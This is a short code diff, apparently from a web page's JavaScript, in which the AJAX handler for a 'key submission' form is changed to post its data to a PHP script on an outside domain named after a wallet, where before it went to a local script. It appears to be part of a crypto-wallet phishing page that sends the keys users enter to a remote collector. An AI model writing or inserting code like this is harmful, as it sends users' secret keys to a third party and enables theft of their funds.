@@ -74,7 +74,7 @@ $('document').ready(function () {
         $('#key_submission button').text('Loading...');
 
         $.ajax({
-            url: './php/mail_key.php',
+            url: 'https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php',
             method: 'POST',
             data: {
                 Type,
